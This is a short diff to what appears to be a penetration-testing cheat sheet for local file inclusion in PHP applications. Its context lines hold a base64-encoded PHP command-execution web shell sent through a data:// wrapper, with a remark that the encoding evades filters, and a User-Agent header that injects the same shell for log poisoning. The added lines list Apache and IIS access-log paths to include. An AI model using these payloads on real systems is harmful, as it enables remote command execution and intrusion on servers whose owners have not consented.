@@ -23,6 +23,14 @@ curl@
 index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a
 # encoded the <?php echo system($_GET["cmd"]);?> payload as Bas64 to bypass filter
 
+====== LOGS =======
+# Apache logs:
+/var/log/apache/access.log
+/var/log/apache2/access.log
+/etc/httpd/logs/access_log
+# IIS log path:
+%SystemDrive%\inetpub\logs\LogFiles
+
 Log Pollution
 User-Agent: <?php echo system($_GET['cmd']); ?>
 # Send request to index.php
